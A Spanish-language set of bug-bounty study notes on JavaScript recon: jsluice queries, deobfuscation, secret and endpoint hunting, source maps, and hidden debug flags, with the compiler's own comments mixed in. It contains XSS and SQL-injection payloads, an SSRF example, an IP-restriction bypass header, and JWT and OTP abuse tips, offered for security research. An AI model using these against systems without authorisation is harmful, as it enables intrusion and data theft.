Tree-Sitter para crear consultas efectivas con jsluice . Esta guía mejorará su capacidad para analizar archivos JavaScript con precisión.

Al dominar las consultas de Tree-Sitter, desbloquearás un nuevo nivel de precisión en el análisis de código JavaScript, mejorando tu capacidad para identificar patrones, vulnerabilidades y más. 🌟



A continuación se muestran 10 ejemplos prácticos de consultas para ' jsluice ' para extraer datos interesantes de archivos JavaScript:

1. Extraiga todos los nombres de funciones

consulta jsluice -q "(nombre de declaración de función: (identificador) @nombre_de_función)" su_archivo.js

2. Encuentra todas las variables declaradas

consulta jsluice -q "(declarador_de_variable id: (identificador) @variable)" su_archivo.js

3. Identifica todas las cadenas utilizadas

consulta jsluice -q "(cadena) @string_value" su_archivo.js

4. Localice todas las llamadas API

consulta jsluice -q "(función call_expression: (member_expression) @api_call)" your_file.js

5. Detectar el uso de 'eval'

consulta jsluice -q "(función call_expression: (nombre del identificador: 'eval'))" your_file.js

6. Encuentra todas las asignaciones a 'window.location'

consulta jsluice -q "(expresión_asignación izquierda: (expresión_miembro objeto: (nombre_identificador: 'ventana') propiedad: (nombre_identificador_propiedad: 'ubicación')))" your_file.js

7. Extraer todos los detectores de eventos

consulta jsluice -q "(función call_expression: (propiedad member_expression: (nombre property_identifier: 'addEventListener'))) @event_listener" your_file.js

8. Encuentra el uso de localStorage

consulta jsluice -q "(objeto member_expression: (nombre del identificador: 'localStorage'))" your_file.js

9. Descubra todas las XMLHttpRequests

jsluice query -q "(nueva_expresión llamada: (nombre del identificador: 'XMLHttpRequest'))" your_file.js

10. Identificar todos los scripts en línea en un archivo HTML

consulta jsluice -q "(elemento_de_script)" su_archivo.html

Cada una de estas consultas apunta a un aspecto específico del código JavaScript que podría revelar información valiosa durante el análisis, como identificar posibles vulnerabilidades o comprender la estructura del código.
lo unico interesante es el linter de js te enseña como descargarlo configurarlo y tambien los 2 opcion intesivo ligero primero comienza con ligero y luego el otro pero resulta falso positivo f de igual manera interesante igual para mi no probo todo tanto estatico como dinamico y ademas no desofuzco lo suficiente y tampoco aplico reglas regex o palabras claves en la busqueda entres otros.
pos no mucho solo algunos recursos y eso.
Últimamente, me he estado volviendo loco con el JavaScript ofuscado. Hace que el análisis estático sea casi imposible, y el dinámico, casi imposible. El proceso de desofuscación puede ser largo y arduo. Me propuse hacerlo un poco más fácil.

matrix y una funcion que manipule eso en link informe foto de referencia de como se ve generalmente interesante.



const G = [ 
    "Firefox" , 
    "modificado" , 
    "continuar" , 
    "antes de descargar" , 
    "idioma del usuario" , 
    "clave temporal" , 
    "controlador de captura de pantalla" , 
    "isHDR" , 
    "hermano anterior" , 
    "evento de teclado " , 
    "teclas numéricas" , 
    "lyy7U" , 
    "isSardineStringEntry" , 
    "RTCEncodedAudioFrame" , 
    "script[src*=extensión]" , 
    "atanh" , 
    ... 
    "dev" ...
También suele haber una función que manipula esta matriz de alguna manera. La función suele tener este aspecto:

función  a3q ( u, R ) { 
  const G = a3b (); 
  return ( 
    (a3q = función ( b, q ) { 
      b = b - 0x77 ; 
      sea K = G[b]; 
      return K; 
    }), 
    a3q (u, R) 
  ); 
} 
( function ( u, R ) { 
  const uZ = a3q, 
    G = u (); 
  while (!![]) { 
    intentar { 
      const b = 
        parseInt ( uZ ( 0xdf )) / 0x1 + 
        (- parseInt ( uZ ( 0x2e5 )) / 0x2 ) * (- parseInt ( uZ ( 0x273 )) / 0x3 ) + 
        - parseInt ( uZ ( 0x221 )) / 0x4 + 
        (- parseInt ( uZ ( 0x86 )) / 0x5 ) * (- parseInt ( uZ ( 0x18f )) / 0x6 ) + 
        - parseInt ( uZ ( 0x242 )) / 0x7 + 
        parseInt ( uZ ( 0xa0 )) / 0x8 + 
        (- parseInt ( uZ ( 0x1df )) / 0x9 ) * ( parseInt ( uZ ( 0x227 )) / 0xa ); 
      si (b === R) break ; 
      de lo contrario G[ ​​"empujar" ](G[ "desplazar" ]()); 
    } catch (q) { 
      G[ "empujar" ](G[ "desplazar" ]()); 
    } 
  } 
})(a3b, 0xa6ef0 ),
 
Lo que esto hace es desplazar inicialmente (mover el primer valor al final)

G [ "empujar" ] (G [ "cambiar" ] ()
nada.
nada
nada
nada
Úselo (\$\.ajax\(\s*url:\s*['"])(\/api\/[^'"]+)para encontrar puntos finales AJAX.

tener en cuenta que esto regla ajax solo se aplicaria a los archivos js dinamicos ya que los estaticos no hacen la llamada por arte de magia ok entonces recolectar js dinamicos interactuando con el sitio web funiones etc con proxy activado capturando todo ok.

Consejo profesional : Busca tokens temporales con una vida útil corta (p. ej., tempToken). Suelen tener una validez de 5 a 15 minutos.

muy bueno eso.



Ignorar scripts de terceros
Error : Solo se audita el código JavaScript propio, sin detectar fugas en bibliotecas de terceros. Por qué falla : Las bibliotecas analytics.jssuelen chatwidget.jscodificar claves específicas del entorno.

Técnica avanzada: auditoría de scripts de terceros
Identificar scripts de terceros:

gospider -s https://target.com --js | grep 'external-domain.com'

2. Comprobar anulaciones:


// Look for domain-specific configs in third-party scripts:
analytics.init({ projectId: 'target_prod_123' });


Consejo profesional : utilice Burp's Collaborator en scripts de terceros para detectar vulnerabilidades SSRF/DSN.

muy bueno esto que viene:

Patrones sutiles faltantes y parámetros de depuración
Error : no buscar indicadores de depuración ni probar parámetros como ?debug=1.

Técnica avanzada: análisis de parámetros de depuración
Agregar parámetros a las URL JS/CSS:

ejemplo:
curl https://target.com/app.js?debug=true  

2. Busque funciones de depuración en el código:

if (debugMode) console.log('Admin token:', token);

Consejo profesional : utilice la función Anular de Chrome para forzar debugMode = truey desbloquear interfaces de usuario ocultas.

No correlacionarse con otras vulnerabilidades
Error : tratar los hallazgos de JS de forma aislada.

Técnica avanzada: encadenamiento de fugas de JS con IDOR/SSRF
Encontrar un punto final en JS:

fetch('/api/users/${id}/delete')
2. Pruebe IDOR intercambiando idvalores.

3. Compruebe si el punto final acepta URL (SSRF):


POST /api/users/123/delete { "url": "http://internal-server" }
Ejemplo del mundo real : un punto final expuesto a JS /api/fetch?url=condujo a SSRF a metadatos de AWS.

Hoja de trucos de banderas
grep:-Ero → Búsqueda de expresiones regulares en archivos

gospider:--subs , --js→ Incluir subdominios, extraer enlaces JS

curl:-H "X-Forwarded-For: 127.0.0.1" → Evitar restricciones de IP

Puppeteer:--no-sandbox → Evitar la zona protegida de Chrome en Docker
varias tools para analisis de .js interesante pero basico.
pyjsparser: Analizador rápido de JavaScript: traducción manual de esprima.js a Python. Tarda 1 segundo en analizar toda la biblioteca de Angular.js, por lo que la velocidad de análisis es de aproximadamente 100 000 caracteres por segundo, lo que lo convierte en el analizador de JavaScript para Python más rápido y comprensible del mercado.

10. Desofuscador de JavaScript: Desofuscador de JavaScript es una herramienta que permite desofuscar código JavaScript. Un desofuscador simple pero potente que elimina técnicas comunes de ofuscación de JavaScript.

Se puede acceder desde el sitio web https://deobfuscate.io/

Consejos para la búsqueda de recompensas por errores de enumeración de JS
Comience analizando el código fuente del sitio web para identificar cualquier archivo JavaScript potencial que pueda estar presente.
Utilice herramientas como JSParser o JSScan para automatizar el proceso de identificación y análisis de archivos JavaScript.
Busque cualquier información confidencial que pueda estar presente en los archivos JavaScript, como credenciales o claves codificadas.
Verifique si hay vulnerabilidades conocidas en las bibliotecas y marcos de JavaScript que se utilizan en el sitio web.
Utilice las herramientas de desarrollo del navegador para analizar el código JavaScript y comprender la funcionalidad del sitio web.
Pruebe vulnerabilidades del lado del cliente, como secuencias de comandos entre sitios (XSS) y falsificación de solicitudes entre sitios (CSRF).
Preste atención a cualquier solicitud de red realizada por el código JavaScript, ya que puede revelar información adicional sobre el sitio web.
Utilice una herramienta proxy como Burp Suite para interceptar y analizar solicitudes y respuestas de JavaScript.
Compruebe si hay scripts de terceros que puedan estar cargados en el sitio web, ya que pueden introducir riesgos de seguridad adicionales.
nada interesante.
Utilicé una extensión de Burp Suite llamada jsluice++ que está disponible en Github.
intersante websocket entontro un token pero expirado ya de igual manera bounty. Ya que estaba expuesto.
crear regla regex para ip.

Bajo ($$) — ~$100-$500
Hallazgo: Dirección IP interna, punto final no sensible, versión de biblioteca desactualizada (sin explotación comprobada).
Ejemplo: El hallazgo const INTERNAL_IP = '192.168.1.55';suele ser meramente informativo, a menos que pueda vincularse con otra vulnerabilidad.

Mediano ($$$) — ~$500-$1,500
Hallazgo: Una clave API válida para un servicio de terceros con permisos reducidos (por ejemplo, una API de análisis de solo lectura o una API de mapas públicos). Se requiere comprobante de recuperación de datos.
Ejemplo: Encontrar una clave API de Google Maps. Aunque suele estar restringida por el referente, se producen errores de configuración. Si se puede usar para generar facturas en su cuenta, el impacto es muy alto.

Alto ($$$$) — ~$1,500-$5,000
Hallazgo: un punto final sensible que revela información de identificación personal (PII), una clave API de acceso de escritura para un servicio no crítico o credenciales codificadas para un entorno de prueba.
Ejemplo: Encontrar un punto final de API no documentado: https://api.target.com/v1/admin/users. O encontrar una clave de API de SendGrid que permita enviar correos electrónicos desde su dominio.

Crítico ($$$$$) — $5,000+
Hallazgo: una clave API maestra, credenciales de AWS, una cadena de conexión de base de datos o un token de acceso privado de GitHub.
Ejemplo 1: Búsqueda AWS_SECRET_ACCESS_KEYen un archivo. Esto puede provocar la apropiación total de la cuenta en la nube, el acceso al bucket de S3 o incluso la generación de instancias EC2 sin su propio dinero.

Ejemplo 2: Encontrar un token de GitHub con repoalcance. Esto podría permitirle clonar sus repositorios privados de código fuente, lo que provocaría una vulneración masiva de la propiedad intelectual.

 La trampa del JWT
Encuentras un JWT (JSON Web Token) en un archivo JS. Probablemente esté caducado. No te detengas.

Pruébelo. Copie el token y pruébelo en diferentes endpoints , especialmente en los administrativos ( /admin, /api/admin). A veces, los desarrolladores codifican tokens temporales para la configuración inicial que nunca se desactivan.
Comprueba la firma. Si la aplicación usa un secreto débil (o ninguno) para firmar los JWT, podrías falsificar tus propios tokens. El secreto usado para firmar podría estar en otra parte del código.
interesante descargar js primero luego embellecer lo minificado, luego desofuscar .


: Descargar y embellecer Primero, haga que el código sea legible.

Copiar
# Download a file of interest
wget https://target.com/static/crypto.min.js -O crypto.js

# Beautify it using js-beautify (install with `npm -g js-beautify`)
js-beautify crypto.js -o crypto-beautified.js
Paso 2: Desofuscar con JSNice. Si el código sigue siendo críptico, JSNice puede hacer maravillas renombrando variables y funciones a algo inteligible. Aunque tiene una interfaz web, suelo usar la API directamente:

Copiar
curl -s -X POST --data-binary "@crypto-beautified.js" "https://www.jsnice.org/beautify?pretty=1&rename=1" -o crypto-deobfuscated.js
Un ejemplo real: la falla de la billetera criptográfica

En un programa privado de recompensas por errores, encontré un archivo llamado walletLogic.min.js. Tras embellecerlo y desofuscarlo, encontré una función como esta:

Copiar
function validateWalletAccess(userId, walletId, authToken) {
    // ... validation logic ...
    if (userHasAccess) {
        return makeApiCall('/api/wallet/' + walletId + '/contents', authToken);
    }
}
La función userHasAccessera compleja, pero noté makeApiCallque construía la URL simplemente concatenando el walletId. Me pregunté: "¿Qué pasa si cambio walletIdel ID de billetera de otro usuario después de que el mío authTokenya esté validado?".

Intercepté una solicitud legítima a mi billetera ( walletId=12345), cambié el ID a 67890y la reenvié. El servidor devolvió la información financiera completa de otro usuario. Se trataba de una vulnerabilidad clásica de Referencia Directa a Objetos Insegura (IDOR), ya que la comprobación del lado del cliente era inútil sin la correspondiente del lado del servidor. Este hallazgo crítico solo era visible al comprender la lógica del código.

Qué buscar durante la revisión manual
eval(), setTimeout()con entrada del usuario: conduce a la ejecución remota de código (RCE) si la entrada no está desinfectada.
Oyentes de PostMessage: una validación incorrecta de originpuede provocar secuencias de comandos entre sitios (XSS) o robo de datos.
Credenciales codificadas: especialmente para servicios de terceros como S3, SendGrid o Firebase.
Funciones criptográficas personalizadas: crear su propio cifrado es una gran señal de alerta.
Parámetros de depuración: Me gusta isAdmin=trueo debugMode=enableeso podría haberse dejado.
maso o menos esta bueno como se expresa le dio un puntito extra.
Por qué son importantes las solicitudes ocultas
A las aplicaciones modernas no les gusta exponer datos en cadenas de consulta.
En lugar de eso, lo empujan todo hacia:
Cuerpos JSON POST → API REST clásicas.
Cuerpos POST de GraphQL → API modernas basadas en consultas.
Estos son invisibles en las URL, lo que hace que sea más difícil detectarlos... a menos que sepas dónde buscar.
Como cazador de errores, su misión es simple: encontrar dónde la entrada del usuario se cuela en estos cuerpos y ver cómo el sistema la refleja o la ejecuta.

Flujo de trabajo del cazador de errores
Configurar Burp Proxy y limitar el alcance de todas las solicitudes.
Mire más allá de la URL: revise el cuerpo del POST .
Para las API JSON : busque entradas de clave/valor como "query", "name", "comment".
Para las API de GraphQL : busque query { … }estructuras o "variables": { ... }.
Inyecta marcadores (por ejemplo, XSS_TEST_123) para ver dónde se refleja.
Reemplazar con cargas útiles → confirmar ejecución.
🏆 La ventaja del cazador de insectos
Los escáneres suelen ignorar los cuerpos JSON y GraphQL. Esto significa:

Menos ruido.
Más posibilidades tendrás de ser el primero en encontrarlo.
Pagos mayores.
Consejo profesional: muchas recompensas de más de $10,000 provienen de cazadores que detectaron una consulta GraphQL oculta o una entrada JSON que otros pasaron por alto.
Paso 2: Cuerpos de JSON POST
Si AJAX es el camarero , entonces los cuerpos JSON POST son la nota que le das al camarero con tu pedido personalizado 📝.

🔹 Conceptos básicos:
Enviado en el cuerpo de la solicitud HTTP, no visible en la URL.
Muy común para API y aplicaciones móviles.
Los desarrolladores lo prefieren porque es ordenado y estructurado.
🔹 Ejemplo de cuerpo JSON:
POST /api/login 
Tipo de contenido: aplicación/json 

{ 
  "nombre de usuario" : "hunter" , 
  "contraseña" : "secret123"
 }
👉¿Dónde miran los cazadores?

Burp Proxy → Inspeccionar el cuerpo de la solicitud.
Reemplazar valores con cargas útiles:
"hunter\"<script>alert(1)</script>
"hunter' OR 1=1 --"
A menudo, los cazadores de errores pasan por alto los cuerpos JSON si solo escanean los parámetros de consulta.

⚡ Paso 3: Consultas GraphQL
Ahora, GraphQL es como hablar directamente con el chef 👨‍🍳. No solo pides comida, sino que le dices al chef exactamente qué ingredientes quieres y cómo quieres que te los sirvan .

🔹 Conceptos básicos:
En lugar de múltiples puntos finales, un punto final (por ejemplo, /graphql) acepta consultas flexibles.
La consulta y los datos se envían en el cuerpo.
🔹 Ejemplo de consulta:
POST /graphql 
Tipo de contenido: aplicación/json 

{ 
  "consulta" : "consulta { usuario(id: \"123\") { nombre, correo electrónico } }"
 }
👉¿Dónde miran los cazadores?

Busca /graphqlo solicita con "query"o "mutation".
Parámetros de prueba dentro de cadenas de consulta:
id: "123 OR 1=1"
name: "<script>alert(1)</script>"
Presione enter o haga clic para ver la imagen en tamaño completo

🏆 Palabras finales: La mina de oro de Bug Bounty
La mayoría de los cazadores solo buscan parámetros de consulta visibles . Pero el verdadero tesoro 💰 reside en:

Llamadas ocultas AJAX 🔍
Cuerpos JSON POST 📦
Consultas GraphQL 🧩
nada
encontro un cupon de descueto del 70% en archivo oculto de .js lo aplico funciono pero el bounty fue super poco solo 750 mal por hunter f.
nada interesante.
pos nada interesante.
El código también buscó [error] window.INTERNAL_OVERRIDE. Este es un patrón de depuración común.
Archivos JS internos filtrados
Buscar:

admin.js, internal.js, beta.js,staging.bundle.js
debug.js, test.js, monitor.js,analytics.js
Estos a menudo incluyen:

Rutas de API internas no expuestas en producción
Conmutadores de funciones
Condicionales JS que revelan rutas lógicas (por ejemplo, if (user.isAdmin))
2️⃣ Puntos finales expuestos
Mira dentro:

axios.get, fetch(), $.ajax, XMLHttpRequest, o personalizadoapiClient.get
Estos revelan:

Puntos finales de API completos como/api/user/tokens
Paneles de administración (por ejemplo, /admin/metrics)
Consultas REST/GraphQL ocultas
3️⃣ Secretos y claves API
Lugares comunes:

config.js, settings.js,.env.sample
Formatos comunes:

const API_KEY = "sk_live_123abc456xyz"; const firebaseConfig = { apiKey: "AIza..." };
4️⃣ Tokens expuestos en confirmaciones de JS
A menudo se encuentra en:
Confirmaciones tempranas ( git log)
Ramas de prueba enviadas
Notas para desarrolladores en las relaciones públicas
Flujo de reconocimiento de GitHub para detectar la exposición basada en JS
🔹 Paso 1: Identificar la organización o los desarrolladores
Nombre de la empresa/organización de destino
Buscar en GitHub:

org:companyname filename:*.js org:companyname "axios.get"
O utilice OSINT para descubrir:

Nombres de usuario de desarrolladores a través de LinkedIn
Contribuciones a los repositorios de la organización mediante contributorgráficos



Paso 3: Analizar la lógica de JS
Una vez que encuentre los archivos JS:

Busque lógica condicional (rutas de administración, omisiones de autenticación):

if (user.role === "admin") { // show advanced panel }
Encuentra rutas de desarrollo internas :

const baseURL = "https://staging-api.example.com/v2"
Funciones de seguimiento que llaman a puntos finales sensibles (como /tokens, /reset-password, /verify-otp)
🔹 Paso 4: Explorar el repositorio en busca de archivos .map (mapas de origen)
A veces los desarrolladores envían .maparchivos, lo que minimiza JS.

Buscar en GitHub:

filename:*.map org:target
Descargue el .maparchivo e inviértalo usando:
herramientas de visualización de mapas de origen
source-map-explorer
Esto le proporciona JS de nivel de desarrollo , completo con comentarios y nombres de funciones.

Bono: Ruta de explotación después del descubrimiento
Si encuentra una ruta JS interna como:

Copiar
apiClient.post('/reset-password', { email })
Puede:

Verificar si el punto final está abierto (prueba mediante Postman)
Comprobar si se aplica la autenticación (encabezados faltantes)
Intente abusar de él con cargas útiles creadas:

Omitir restablecimiento de contraseña
Fuerza bruta de OTP
Inyección de correo electrónico, etc.


Herramientas para potenciar este reconocimiento
🔍 github-subdomains: Encuentra subdominios desde el código de GitHub
🔎 trufflehog, gitleaks: Atrapa secretos
📦 usedJS: (si está archivado, usa bifurcaciones o alternativas como JSFinder)
🔄 gf, grep, ripgrep: Para la coincidencia de patrones en repositorios clonados
📁 source-map-explorer: Archivos .map de JS inversos
varias extensiones de bupp suite.
nada interesante.
Como funciona realmente .js en los navegadores con los diferentes motores que tiene cada navegador.


Cómo funciona :
El navegador tiene un motor JavaScript incorporado.
Chrome → Motor V8
Firefox → SpiderMonkey
Safari → JavaScriptCore
Cuando el navegador lee una <script>etiqueta en HTML, envía el código JavaScript a este motor.
El motor analiza (lee) y ejecuta (corre) el código línea por línea.
Así que básicamente el entorno es:

Navegador (con motor JS) 
      ↳ Ejecuta JavaScript 
      ↳ Da acceso a las API del navegador (DOM, eventos, etc.)
🔹 Dónde se puede ejecutar JavaScript (además del navegador)
En la PC (fuera del navegador):
Con Node.js → un entorno de ejecución que utiliza el motor V8 de Chrome pero agrega características de PC/servidor (archivos, red, etc.).
Ejemplo:
// test.js console.log ( " ¡Hola desde Node.js!" );
Correr con:
prueba de nodo.js
En servidores :
JavaScript puede impulsar aplicaciones backend completas (por ejemplo, sitios web creados con Express.js en Node.js).
En bases de datos :
algunas bases de datos (como MongoDB) permiten JavaScript para consultas.
En otros lugares :
Aplicaciones móviles (React Native).
Aplicaciones de escritorio (Electron, como VS Code).
Dispositivos IoT (bombillas inteligentes, Raspberry Pi).
🔹 ¿Qué sucede si JavaScript no está disponible?
En el navegador :
La página se cargará, pero solo como HTML y CSS simples → sin interactividad.
Ejemplo: Se mostrará un formulario de inicio de sesión, pero al presionar “Enviar” es posible que no se valide la entrada al instante.
Los menús desplegables, las animaciones o las ventanas de chat no funcionarán.
En el servidor/PC :
Si falta JavaScript, no podrás ejecutar aplicaciones Node.js ni herramientas basadas en JS.
🔹 Beneficios de JavaScript
✅ Funciona en todas partes (multiplataforma).
✅ Hace que los sitios web sean dinámicos e interactivos .
✅ Enorme ecosistema (bibliotecas como React, Angular, Vue).
✅ El mismo lenguaje se puede usar para frontend + backend .
✅ Muy popular → muchos trabajos, soporte, herramientas.

Ejemplo para comparar:

Sin JS (sólo HTML):

Botón < Haz clic en mí </ botón >
👉 Solo un botón. No hace nada.

Con JS:

< button  onclick = "alert('¡Hola!')" > Haz clic en mí </ button >
👉Ahora aparece un mensaje.

En resumen:
JavaScript se ejecuta dentro de un motor (principalmente en el navegador), pero gracias a Node.js también puede ejecutarse fuera de él, en PC, servidores e incluso dispositivos IoT. Sin él, la web sería estática y aburrida.
Muy bueno explicacion a detalle sobre los 10 errores mas comunes de js
super bueno mirar aprendes mucho incluso sirve para otra vulnerabilidad protype etc super bueno.

Profundizar mas en js errores comunes tips etc:


1️⃣ Confusión de igualdad: ==vs===
La igualdad flexible ( ) de JavaScript ==realiza una coerción de tipos , lo que conduce a resultados extraños.

Copiar
0 == false; // true
0 === false; // false
"" == 0; // true
[] == false; // true
👉El Error: Confiar accidentalmente en ==comparar valores.

Solución : Úsalo siempre, ===a menos que tengas una razón muy específica para obligarte. Las reglas de pelusa ( eqeqeq) pueden hacer que esto suceda.

2️⃣ Olvidar letyconst
Declarar variables sin let/ constcrea automáticamente una variable global (en modo no estricto).

Copiar
function test() {
  message = "Oops!";
}
test();
console.log(message); // "Oops!" leaked to global scope
👉El Error: Ensombrecer o contaminar el ámbito global sin intención.

✅ La solución: utilice use stricto configure siempre ESLint para evitar variables no declaradas.

3️⃣ Mal usothis
thisNo se comporta como la mayoría de los desarrolladores de programación orientada a objetos esperan. Su valor depende de cómo se llama a una función , no de dónde se define.

Copiar
const obj = {
  name: "Alice",
  greet: function () {
    setTimeout(function () {
      console.log(this.name); // undefined
    }, 100);
  },
};
obj.greet();
👉El error: Esperar thishacer referencia objdentro del callback.

✅ La solución: utilice funciones de flecha o vincule explícitamente:

Copiar
setTimeout(() => console.log(this.name), 100);
4️⃣ Pesadillas matemáticas de punto flotante
JavaScript utiliza doble precisión IEEE 754 , por lo que algunos números no se pueden representar con exactitud.

Copiar
0.1 + 0.2 === 0.3; // false
👉El error: confiar en matemáticas decimales precisas para monedas, finanzas o mediciones.

✅ La solución: utilice bibliotecas ( decimal.js, big.js) o BigIntpara mayor precisión.

5️⃣ Mal uso de Async/Await
Incluso los desarrolladores experimentados olvidan que awaitsolo funciona dentro asyncde funciones y que serializa operaciones a menos que se use con prudencia.

Copiar
// ❌ Slow: runs sequentially
await task1();
await task2();
// ✅ Faster: run in parallel
await Promise.all([task1(), task2()]);
👉El error: convertir el código asincrónico en código lento y pseudo-sincrónico.

✅ La solución: saber cuándo se pueden paralelizar las tareas y utilizarlas Promise.all.

6️⃣ Congelación accidental del bucle de eventos
Las operaciones de bloqueo bloquean el bucle de eventos de un solo subproceso.

Copiar
while (true) {} // ❌ Infinite loop, app freezes
👉 El error: escribir bucles que consumen mucho CPU o operaciones de sincronización en Node.js/navegador.

✅ La solución: divida el trabajo en fragmentos con setImmediate, setTimeout, o utilice trabajadores para tareas que requieren un uso intensivo de la CPU.

7️⃣ Confuso nullyundefined
Estos dos son tipos diferentes , pero muchos desarrolladores los tratan de la misma manera.

Copiar
typeof null; // "object" (bug since 1995!)
typeof undefined; // "undefined"
👉El Error: Olvidar que nullestá explícitamente asignado, mientras que undefinedmuchas veces significa “aún no definido”.

✅ Solución: Sé intencional: úsalo nullpara "valor vacío" undefinedo "no asignado". Herramientas como TypeScript ayudan.

8️⃣ Ignorar la contaminación de los prototipos
Los objetos JS son mutables y comparten prototipos : a los atacantes les encanta esto.

Copiar
let payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log({}.polluted); // "yes"
👉 El error: Fusiones de objetos no seguras ( Object.assignbibliotecas de copia profunda).

✅ Solución: Sanee la entrada del usuario y congele los objetos críticos. Las revisiones de seguridad siempre deben verificar el manejo de objetos.

9️⃣ Pensar for...ines seguro
for...inTambién itera sobre las propiedades heredadas , no solo sobre las propias del objeto.

Copiar
Object.prototype.hack = "💀";
for (let key in { a: 1 }) {
  console.log(key); // "a", "hack"
}
👉El Error: Llaves inesperadas filtrándose en los bucles.

✅ La solución: utiliza Object.keys(), Object.values(), o Object.entries().

🔟 El uso excesivo eval()oFunction()
Sigue siendo uno de los mayores errores.

Copiar
eval("console.log('Hacked!')"); // Arbitrary code execution
👉El error: utilizar evalpara comportamiento dinámico.

✅ La solución: Evítalo a toda costa. Casi siempre hay una alternativa más segura.

🎯 Conclusiones clave
Las peculiaridades de JavaScript no son "errores de principiante": son minas terrestres que incluso los desarrolladores más experimentados pisan.
Muchos errores no son simplemente errores, son problemas de seguridad (XSS, contaminación de prototipos, DoS).
La mejor defensa es una combinación de análisis de errores, revisión de código y pruebas , no solo la intuición del desarrollador.
esta bueno ya que habla sobre rce mediante un archivo .js que por uan transiccion de version de next dejo sin cometar parte del codigo funciones y por ende expuesto.
nada interesante.
No entiendo del todo me falta conocimiento mas solidos de js, para poder manejar la fuga de memoria entendi algo pero no logro captar como hacerlo realmente.
El .js.maparchivo actúa como guía, proporcionando un mapa detallado entre el código minimizado y el código fuente original, legible para humanos, incluyendo nombres de variables, nombres de funciones, rutas de archivos e incluso comentarios. Esto significa que, si un js.maparchivo es de acceso público, un atacante puede reconstruir eficazmente todo el árbol de código fuente de la aplicación.

Este código fuente reconstruido puede revelar:

Puntos finales de API: puntos finales de API ocultos o internos que no están documentados públicamente.
Estructuras y esquemas de datos: la estructura exacta de los objetos de datos, incluidas las consultas y esquemas GraphQL, que a menudo definen campos y operaciones sensibles.
Mecanismos de autenticación: detalles sobre cómo se manejan la autenticación y autorización de los usuarios.
Lógica empresarial: información sobre la funcionalidad principal de la aplicación, incluidas posibles vulnerabilidades.
Cadenas sensibles: a veces, claves API codificadas, secretos o identificadores internos.


Desempaquetado de mapas fuente con Sourcemapper
Para trabajar eficazmente con js.maparchivos, las herramientas especializadas son invaluables. Una de ellas es Sourcemapper .

Sourcemapper está diseñado para extraer árboles de código fuente de JavaScript de archivos Sourcemap. Analiza un mapa de código fuente, generalmente generado por empaquetadores como Webpack, y luego recrea los archivos JavaScript originales y su estructura de directorios según las rutas de archivo especificadas en el mapa de código fuente.

Sourcemapper puede procesar un .maparchivo directamente desde una URL o un archivo local. También puede procesar un archivo JavaScript desde una URL, detectando y descargando automáticamente cualquier referencia a sourcemap (incluyendo referencias absolutas, relativas y data:URI). Una vez recuperado y analizado el sourcemap, Sourcemapper escribe los archivos fuente extraídos en un directorio de salida específico, proporcionando una réplica completa del código fuente original.

Para una búsqueda y volcado de vulnerabilidades GraphQL más extenso, graphqlmaptambién se encuentran disponibles herramientas como . graphqlmapes conocido por sus capacidades para automatizar el proceso de búsqueda y explotación de vulnerabilidades GraphQL, incluido el volcado de esquema completo.
MUY BUENO FUNCIONES OCULTRAS DE DEBUG ETC.

Los frontends modernos (React, Angular, Vue, Svelte) suelen depender de conmutadores de funciones, indicadores de entorno y componentes renderizados condicionalmente que permanecen inactivos o invisibles en el flujo de trabajo normal del usuario. Sin embargo, a veces, los desarrolladores dejan estos conmutadores en el código de producción, ya sea por accidente o por comodidad de acceso interno.

Estas banderas pueden activar vistas de depuración, paneles internos, funciones privilegiadas o herramientas de administración. Al ser expuestas a usuarios no autenticados o incluso a cuentas con pocos privilegios, pueden utilizarse para la escalada de privilegios, eludir la lógica, divulgar información o controlar completamente la aplicación.


Qué son los indicadores de depuración y las herramientas para desarrolladores?
En las aplicaciones frontend, los desarrolladores a menudo introducen atajos o herramientas de depuración para:

Funciones de alternancia en desarrollo
Registro del estado interno
Obtener acceso de administrador rápidamente
Simulación de casos extremos
Cambio de entornos (producción, desarrollo, ensayo)
Estos se controlan a través de variables como:

debug=true
mode=admin
devPanel=1
window.__SHOW_ADMIN__ = true
localStorage.setItem("isAdmin", true)
En teoría, estas banderas se eliminan o desactivan antes de que el código se envíe a producción. En realidad, las implementaciones apresuradas, los errores de CI/CD y los paquetes minimizados pero no ofuscados suelen provocar que estas características se filtren a los entornos de producción.

A veces, son inofensivos. Otras veces, desbloquean paneles de control completos que no están destinados al público.

Busque también comprobaciones condicionales y alternancias de funciones:


grep -P 'if\\s*\\(.(localStorage|sessionStorage|window.location|cookies)' js_files/* > logic_hits.txt


: Decodificar archivos minimizados u ofuscados
Utilice herramientas como:

Beautifier.io
js-beautify
Más bonita
Hacer que el código sea legible para humanos e identificar patrones lógicos.

Paso 4: Emular las condiciones de la bandera
Busque cosas como:

Copiar
if (window.location.search.includes("mode=admin")) {
   renderAdminPanel();
}
O:

Copiar
if (localStorage.getItem("betaUI") === "true") {
   launchBeta();
}
Intente activarlos manualmente:

Copiar
localStorage.setItem("betaUI", "true");
location.reload();
O:

Copiar
<https://target.com/app?mode=admin>
Paso 5: Busque llamadas API internas
Si aparece una interfaz de depuración o administración, revise la pestaña Red en DevTools. Busque nuevas solicitudes de API o acceso a endpoints privilegiados.

Si ve solicitudes a puntos finales como:

Copiar
/api/internal/*
/api/admin/users
/api/logs
Es posible que estés viendo funciones backend sensibles desbloqueadas a través de indicadores frontend.


Casos reales de herramientas administrativas ocultas
Caso 1: Vista de depuración de Vue conadmin=true

Un investigador descubrió que al agregar ?admin=trueuna URL a un panel basado en Vue se generaba un diseño completamente nuevo con:

Suplantación de identidad de usuario
Registros sin procesar
Métricas del sistema en vivo
Modos de prueba de la pasarela de pago
Caso 2: React Build con el indicador LocalStorage

En una aplicación React, el investigador encontró esto en el código:

Copiar
if (localStorage.getItem("showDebug") === "yes") {
   render(<DevTools />);
}
Ejecutando esto en la consola del navegador:

Copiar
localStorage.setItem("showDebug", "yes");
location.reload();
La página se recargó con una pestaña adicional que muestra:

Variables de entorno
Tokens de API en memoria
Probar los cambios de usuario
Caso 3: Ruta angular oculta con parámetro de consulta

Una SPA angular contenía una ruta oculta que solo era visible si el usuario navegaba a:

Copiar
<https://target.com/dashboard?mode=god>
Desbloqueó los permisos CRUD en un recurso que los usuarios regulares sólo podían ver.

Caso 4: Importaciones condicionales

A veces, las herramientas de depuración se importan pero se inicializan condicionalmente:

Copiar
if (process.env.SHOW_INTERNAL_TOOLS) {
   import("./internalTools.js").then(initTools);
}
Sin embargo, el paquete los incluyó de todas formas y los investigadores expertos encontraron el archivo JS y lo invocaron initTools()manualmente a través de DevTools.
Técnicas avanzadas de JS RE
Lógica ofuscada
Buscar:

